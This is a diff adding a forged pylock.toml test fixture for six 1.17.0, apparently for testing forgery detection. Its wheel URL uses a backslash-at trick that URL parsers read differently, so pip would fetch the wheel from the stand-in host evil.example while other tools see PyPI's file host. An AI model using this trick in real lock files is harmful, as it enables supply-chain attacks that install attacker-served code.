@@ -1,0 +1,10 @@
+# Forged (B2): six 1.17.0 from uv 0.12.21's pylock.toml (test/fixtures/python/locks/uv-0.12.21/simple), with a url that WHATWG (Node, uv) serialises to the index's url for the wheel, while Python's urlsplit (pip) reads the host evil.example.
+lock-version = "1.0"
+created-by = "uv"
+requires-python = ">=3.9"
+
+[[packages]]
+name = "six"
+version = "1.17.0"
+index = "https://pypi.org/simple"
+wheels = [{ url = 'https://files.pythonhosted.org\@evil.example/../packages/b7/ce/149a00dd41f10bc29e5921b496af8b574d8413afcd5e30dfa0ed46c2cc5e/six-1.17.0-py2.py3-none-any.whl', upload-time = 2024-12-04T17:35:26Z, size = 11050, hashes = { sha256 = "4721f391ed90541fddacab5acf947aa0d3dc7d27b2e1e8eda2be8970586c3274" } }]
